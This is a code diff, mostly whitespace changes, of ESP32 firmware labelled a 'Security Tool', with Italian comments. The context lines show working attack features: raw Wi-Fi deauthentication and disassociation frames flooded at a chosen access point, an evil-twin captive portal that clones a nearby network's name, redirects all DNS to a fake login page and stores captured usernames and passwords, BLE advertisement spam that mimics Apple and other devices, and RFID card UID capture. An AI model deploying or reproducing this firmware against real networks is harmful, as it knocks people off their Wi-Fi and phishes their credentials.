@@ -1,3 +1,9 @@
+/*
+ * BRUCE-S3 v4.0 ULTIMATE - ESP32 Security Tool
+ * Features: WiFi Portal, Deauth Attack, BLE Spam, RFID Manager, Sound Analyzer
+ * NEW: Screen Sleep, Enhanced BLE, Multi-band WiFi, RFID, Audio Analysis
+ */
+
 #include "esp_wifi.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/semphr.h"
@@ -379,12 +385,12 @@ void saveRFIDCards() {
 
 void addRFIDCard(uint32_t uid) {
   if (savedCardsCount >= MAX_RFID_CARDS) return;
-
+  
   // Controlla se esiste già
   for (int i = 0; i < savedCardsCount; i++) {
     if (savedCards[i].uid == uid) return;
   }
-
+  
   savedCards[savedCardsCount].uid = uid;
   snprintf(savedCards[savedCardsCount].name, 16, "Card_%d", savedCardsCount + 1);
   savedCardsCount++;
@@ -401,12 +407,12 @@ void deleteAllRFIDCards() {
 bool scanRFIDCard() {
   if (!rfid.PICC_IsNewCardPresent()) return false;
   if (!rfid.PICC_ReadCardSerial()) return false;
-
+  
   scannedUID = 0;
   for (byte i = 0; i < rfid.uid.size; i++) {
     scannedUID = (scannedUID << 8) | rfid.uid.uidByte[i];
   }
-
+  
   rfid.PICC_HaltA();
   rfid.PCD_StopCrypto1();
   return true;
@@ -430,9 +436,9 @@ void startSoundScan(int duration) {
 
 void updateSoundScan() {
   if (!soundScanning) return;
-
+  
   int reading = analogRead(SOUND_PIN);
-
+  
   if (soundIndex < SOUND_SAMPLES) {
     soundBuffer[soundIndex++] = reading;
   } else {
@@ -442,22 +448,22 @@ void updateSoundScan() {
     }
     soundBuffer[SOUND_SAMPLES - 1] = reading;
   }
-
+  
   // Update stats
   soundMax = max(soundMax, reading);
   soundMin = min(soundMin, reading);
-
+  
   // Detect peaks
   static int lastReading = 0;
   if (reading > lastReading + 100) {
     soundPeaks++;
   }
   lastReading = reading;
-
+  
   // Check if done
   if (millis() - soundScanStart >= soundScanDuration) {
     soundScanning = false;
-
+    
     // Calculate average
     long sum = 0;
     for (int i = 0; i < SOUND_SAMPLES; i++) {
@@ -471,22 +477,22 @@ void drawSoundWaveform(int startY, int height) {
   // Usa tutti i campioni disponibili per il waveform
   int step = max(1, SOUND_SAMPLES / SCREEN_WIDTH);
   int prevY = startY + height / 2;
-
+  
   for (int x = 0; x < SCREEN_WIDTH; x++) {
     int idx = x * step;
     if (idx >= SOUND_SAMPLES) break;
-
+    
     int val = soundBuffer[idx];
     // Map con range aumentato per vedere meglio le onde
     int y = map(val, 0, 4095, startY + height - 1, startY + 1);
     y = constrain(y, startY, startY + height - 1);
-
+    
     if (x > 0) {
       display.drawLine(x - 1, prevY, x, y, SSD1306_WHITE);
     }
     prevY = y;
   }
-
+  
   // Linea centrale di riferimento
   display.drawLine(0, startY + height/2, SCREEN_WIDTH, startY + height/2, SSD1306_WHITE);
 }
@@ -530,7 +536,7 @@ void startBleSpam(BleType type) {
 
 void runBLESpam() {
   static uint32_t lastBleRotate = 0;
-
+  
   if (millis() - lastBleRotate > bleRotationInterval) {
     lastBleRotate = millis();
 
@@ -556,12 +562,12 @@ void runBLESpam() {
 
     uint8_t *payload;
     size_t len;
-
+    
     if (selectedBleType == ALL_RANDOM) {
       // Cicla tra tutti i tipi
       int type = bleVariant % 4;
       bleVariant++;
-
+      
       switch(type) {
         case 0:
           payload = apple_variants[random(0, 3)];
@@ -599,7 +605,7 @@ void runBLESpam() {
     oAdvertisementData.addData(String((char *)payload, len));
     pAdvertising->setAdvertisementData(oAdvertisementData);
     pAdvertising->start();
-
+    
     bleSpamPacketsSent++;
   }
 }
@@ -615,7 +621,7 @@ void TaskWiFi(void *pvParameters) {
       server.handleClient();
     } else if (currentMode == DEAUTH && deauthReady) {
       esp_wifi_set_channel(target_channel, WIFI_SECOND_CHAN_NONE);
-
+      
       uint8_t deauthPacket[26] = {
           0xC0, 0x00, 0x00, 0x00,
           0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -625,7 +631,7 @@ void TaskWiFi(void *pvParameters) {
           target_bssid[3], target_bssid[4], target_bssid[5],
           0x00, 0x00, 0x06, 0x00
       };
-
+      
       uint8_t disasPacket[26] = {
           0xA0, 0x00, 0x00, 0x00,
           0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
@@ -635,13 +641,13 @@ void TaskWiFi(void *pvParameters) {
           target_bssid[3], target_bssid[4], target_bssid[5],
           0x00, 0x00, 0x01, 0x00
       };
-
+      
       // Invia pacchetti multipli per maggiore efficacia
       for (int i = 0; i < 5; i++) {
         esp_wifi_80211_tx(WIFI_IF_AP, deauthPacket, sizeof(deauthPacket), false);
         esp_wifi_80211_tx(WIFI_IF_AP, disasPacket, sizeof(disasPacket), false);
       }
-
+      
       attack_count += 10;
       vTaskDelay(pdMS_TO_TICKS(20));
     }
@@ -675,7 +681,7 @@ void loadLastCreds() {
       lastLine = f.readStringUntil('\n');
     }
     f.close();
-
+    
     if (lastLine.length() > 0) {
       int uIdx = lastLine.indexOf("U: ");
       int pIdx = lastLine.indexOf(" | P: ");
@@ -718,18 +724,18 @@ void startPortal(String ssid) {
   WiFi.mode(WIFI_AP);
   WiFi.softAP(target_ssid.c_str());
   dnsServer.start(53, "*", WiFi.softAPIP());
-
+  
   server.on("/", []() {
     server.send(200, "text/html", login_html);
   });
-
+  
   server.on("/login", HTTP_POST, handleLogin);
-
+  
   server.onNotFound([]() {
     server.sendHeader("Location", "http://192.168.4.1/", true);
     server.send(302, "text/plain", "");
   });
-
+  
   server.begin();
   currentMode = PORTAL;
   textScroll = 0;
@@ -746,12 +752,12 @@ void startDeauth(int index) {
   target_channel = WiFi.channel(index);
   memcpy(target_bssid, WiFi.BSSID(index), 6);
   cleanNetworkState();
-
+  
   // Supporto multi-banda
   if (target_channel < 1 || target_channel > 14) {
     target_channel = 1;
   }
-
+  
   bool bssidValid = false;
   for (int i = 0; i < 6; i++) {
     if (target_bssid[i] != 0x00) {
@@ -759,13 +765,13 @@ void startDeauth(int index) {
       break;
     }
   }
-
+  
   if (!bssidValid) {
     currentMode = MENU;
     needsUpdate = true;
     return;
   }
-
+  
   WiFi.mode(WIFI_AP_STA);
   WiFi.softAP("bruce-deauth", "", target_channel, true, 1);
   esp_wifi_set_promiscuous(true);
@@ -788,7 +794,7 @@ void drawUI() {
   }
 
   String userCopy, passCopy;
-
+  
   if (xSemaphoreTake(xMutex, pdMS_TO_TICKS(10))) {
     userCopy = captured_user;
     passCopy = captured_pass;
@@ -807,11 +813,11 @@ void drawUI() {
     case MENU: {
       display.print("BRUCE-S3 v4.0");
       display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
-
+      
       // Scroll menu se necessario
       int startIdx = max(0, menuIndex - 4);
       int endIdx = min(totalOptions, startIdx + 5);
-
+      
       for (int i = startIdx; i < endIdx; i++) {
         int yPos = 15 + ((i - startIdx) * 10);
         display.setCursor(5, yPos);
@@ -889,7 +895,7 @@ void drawUI() {
       } else {
         int startPos = max(0, scanIndex - 2);
         int endPos = min(networksFound, startPos + 5);
-
+        
         for (int i = startPos; i < endPos; i++) {
           int yPos = 15 + ((i - startPos) * 9);
           display.setCursor(0, yPos);
@@ -996,7 +1002,7 @@ void drawUI() {
       display.println("Place card on");
       display.setCursor(20, 35);
       display.println("reader...");
-
+      
       if (cardDetected) {
         display.setCursor(0, 50);
         display.print("UID:");
@@ -1014,13 +1020,13 @@ void drawUI() {
       } else {
         int startPos = max(0, rfidCardIndex - 2);
         int endPos = min(savedCardsCount, startPos + 4);
-
+        
         for (int i = startPos; i < endPos; i++) {
           int yPos = 15 + ((i - startPos) * 11);
           display.setCursor(0, yPos);
           if (i == rfidCardIndex) {
             display.setTextColor(SSD1306_BLACK, SSD1306_WHITE);
-            display.print("> ");
+            display.print(">");
           } else {
             display.setTextColor(SSD1306_WHITE);
             display.print(" ");
@@ -1056,14 +1062,14 @@ void drawUI() {
     case SOUND_SCAN: {
       display.print("SOUND SCAN");
       display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
-
+      
       if (soundScanning) {
         display.setCursor(0, 15);
         display.print("Scanning...");
         int elapsed = (millis() - soundScanStart) / 1000;
         display.print(elapsed);
         display.print("s");
-
+        
         drawSoundWaveform(25, 30);
       } else {
         display.setCursor(0, 15);
@@ -1084,18 +1090,18 @@ void drawUI() {
     case SOUND_LIVE: {
       display.print("LIVE AUDIO");
       display.drawLine(0, 9, 128, 9, SSD1306_WHITE);
-
+      
       // Leggi valore corrente
       int currentLevel = analogRead(SOUND_PIN);
-
+      
       // Waveform grande e visibile
       drawSoundWaveform(12, 35);
-
+      
       // Barra livello attuale
       int barWidth = map(currentLevel, 0, 4095, 0, 118);
       display.fillRect(5, 50, barWidth, 6, SSD1306_WHITE);
       display.drawRect(4, 49, 120, 8, SSD1306_WHITE);
-
+      
       // Info numerica
       display.setCursor(0, 58);
       display.setTextSize(1);
@@ -1139,12 +1145,12 @@ void drawUI() {
 
 bool consumeButtonPress(int pin, ButtonState &state) {
   bool reading = digitalRead(pin);
-
+  
   if (reading != state.lastReading) {
     state.lastReading = reading;
     state.lastChange = millis();
   }
-
+  
   if (millis() - state.lastChange >= debounceMs && reading != state.stableHigh) {
     state.stableHigh = reading;
     if (!state.stableHigh) {
@@ -1152,7 +1158,7 @@ bool consumeButtonPress(int pin, ButtonState &state) {
       return true;
     }
   }
-
+  
   return false;
 }
 
@@ -1162,9 +1168,9 @@ bool consumeButtonPress(int pin, ButtonState &state) {
 
 void setup() {
   Serial.begin(115200);
-
+  
   xMutex = xSemaphoreCreateMutex();
-
+  
   // Display
   Wire.begin(9, 8);
   if (!display.begin(SSD1306_SWITCHCAPVCC, 0x3C)) {
@@ -1215,7 +1221,7 @@ void setup() {
   display.println("ULTIMATE");
   display.display();
   delay(1500);
-
+  
   lastActivityTime = millis();
   needsUpdate = true;
 }
@@ -1229,7 +1235,7 @@ void loop() {
   static uint32_t lastDrawTime = 0;
 
   // Check screen timeout
-  if (!screenSleepEnabled && currentMode == MENU &&
+  if (!screenSleepEnabled && currentMode == MENU && 
       millis() - lastActivityTime > SCREEN_TIMEOUT) {
     screenSleepEnabled = true;
     display.ssd1306_command(SSD1306_DISPLAYOFF);
@@ -1238,7 +1244,7 @@ void loop() {
 
   // Button polling
   if (millis() - lastActionTime > 120) {
-
+    
     if (consumeButtonPress(PIN_UP, upButton)) {
       switch (currentMode) {
         case MENU:
@@ -1270,7 +1276,7 @@ void loop() {
       needsUpdate = true;
       lastActionTime = millis();
     }
-
+    
     else if (consumeButtonPress(PIN_DOWN, downButton)) {
       switch (currentMode) {
         case MENU:
@@ -1302,7 +1308,7 @@ void loop() {
       needsUpdate = true;
       lastActionTime = millis();
     }
-
+    
     else if (consumeButtonPress(PIN_OK, okButton)) {
       unsigned long pressStart = millis();
       while (digitalRead(PIN_OK) == LOW && millis() - pressStart < 2000) {
@@ -1320,7 +1326,7 @@ void loop() {
             if (kbBuffer.length() < 20) kbBuffer += kbChar;
           }
           break;
-
+          
         case MENU:
           if (menuIndex == 0) startPortal(custom_ssid);
           else if (menuIndex == 3) {
@@ -1371,22 +1377,22 @@ void loop() {
             scanIndex = 0;
           }
           break;
-
+          
         case BLE_SELECT:
           startBleSpam((BleType)bleSelectIndex);
           break;
-
+          
         case SCANNER:
           if (networksFound > 0) {
             if (menuIndex == 1) startPortal(WiFi.SSID(scanIndex));
             else if (menuIndex == 2) startDeauth(scanIndex);
           }
           break;
-
+          
         case VIEW_CREDS:
           currentMode = MENU;
           break;
-
+          
         case RFID_MENU:
           if (rfidMenuIndex == 0) {
             currentMode = RFID_SCAN;
@@ -1407,7 +1413,7 @@ void loop() {
           }
           else currentMode = MENU;
           break;
-
+          
         case RFID_SCAN:
           if (cardDetected) {
             addRFIDCard(scannedUID);
@@ -1419,11 +1425,11 @@ void loop() {
             currentMode = RFID_MENU;
           }
           break;
-
+          
         case RFID_LIST:
           currentMode = RFID_MENU;
           break;
-
+          
         case SOUND_MENU:
           if (soundMenuIndex == 0) {
             startSoundScan(5000);
@@ -1442,7 +1448,7 @@ void loop() {
             // Reset completo buffer
             memset(soundBuffer, 2048, sizeof(soundBuffer)); // Centro a 2048 (metà range ADC)
             soundIndex = SOUND_SAMPLES; // Inizia con buffer pieno
-
+            
             // Pre-riempi con valori centrali per evitare salto iniziale
             for (int i = 0; i < SOUND_SAMPLES; i++) {
               soundBuffer[i] = 2048;
@@ -1450,25 +1456,25 @@ void loop() {
           }
           else currentMode = MENU;
           break;
-
+          
         case SOUND_SCAN:
           if (!soundScanning) currentMode = SOUND_MENU;
           break;
-
+          
         case SOUND_LIVE:
           currentMode = SOUND_MENU;
           break;
-
+          
         case WIFI_BANDS:
           wifiMultiBand = !wifiMultiBand;
           needsUpdate = true;
           break;
       }
-
+      
       needsUpdate = true;
       lastActionTime = millis();
     }
-
+    
     else if (consumeButtonPress(PIN_ESC, escButton)) {
       switch (currentMode) {
         case KEYBOARD:
@@ -1502,20 +1508,20 @@ void loop() {
     // Leggi multiple samples per frame per avere onde fluide
     for (int i = 0; i < 5; i++) {
       int reading = analogRead(SOUND_PIN);
-
+      
       // DEBUG: Stampa ogni 50 letture
       static int debugCounter = 0;
       if (debugCounter++ % 50 == 0) {
         Serial.print("Sound reading: ");
         Serial.println(reading);
       }
-
+      
       // Shift buffer a sinistra
       for (int j = 0; j < SOUND_SAMPLES - 1; j++) {
         soundBuffer[j] = soundBuffer[j + 1];
       }
       soundBuffer[SOUND_SAMPLES - 1] = reading;
-
+      
       delayMicroseconds(100); // Piccolo delay tra campioni
     }
     needsUpdate = true;
@@ -1527,7 +1533,7 @@ void loop() {
   }
 
   // Update display
-  if (needsUpdate ||
+  if (needsUpdate || 
       (currentMode == DEAUTH && millis() - lastDrawTime > 250) ||
       (currentMode == BLE_SPAM && millis() - lastDrawTime > 250) ||
       (currentMode == SOUND_LIVE && millis() - lastDrawTime > 50) ||  // 20 FPS per audio live
